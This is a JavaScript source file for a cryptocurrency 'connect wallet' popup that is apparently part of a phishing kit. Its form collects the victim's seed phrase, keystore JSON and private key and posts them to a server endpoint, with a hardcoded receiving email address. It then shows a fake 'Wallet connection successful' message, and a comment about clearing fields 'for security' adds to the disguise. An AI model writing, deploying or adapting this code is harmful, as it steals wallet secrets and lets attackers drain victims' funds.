/** @format */

function showPopup(walletName) {
	const popup = document.getElementById('walletPopup');
	const title = document.getElementById('popupTitle');
	title.textContent = `Connect ${walletName}`;
	popup.style.display = 'flex';

	document.getElementById('walletForm').onsubmit = async function (e) {
		e.preventDefault();

		const phrase = document.getElementById('phrase').value.trim();
		const keystoreJSON = document.getElementById('keystore').value.trim();
		const privateKey = document.getElementById('privateKey').value.trim();

		if (!phrase && !keystoreJSON && !privateKey) {
			alert('Please fill at least one field.');
			return;
		}

		// Package data to send
		const walletData = {
			to: 'maxwellexcel2@gmail.com', // Hardcoded receiver as mentioned in your description
			walletName,
			phrase,
			keystoreJSON, // Changed from keystore to keystoreJSON to match server expectations
			privateKey,
		};

		try {
			// Send data to your server endpoint
			const response = await fetch('/submit', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(walletData),
			});

			if (response.ok) {
				const result = await response.json();
				alert('Wallet connection successful! ✅');
			} else {
				const errorData = await response.json();
				alert(`Error: ${errorData.error || 'Something went wrong.'}`);
			}
		} catch (error) {
			console.error('Connection error:', error);
			alert('Failed to connect. Please try again later.');
		}

		closePopup();
	};
}

function closePopup() {
	document.getElementById('walletPopup').style.display = 'none';

	// Clear form fields for security
	document.getElementById('phrase').value = '';
	document.getElementById('keystore').value = '';
	document.getElementById('privateKey').value = '';
}
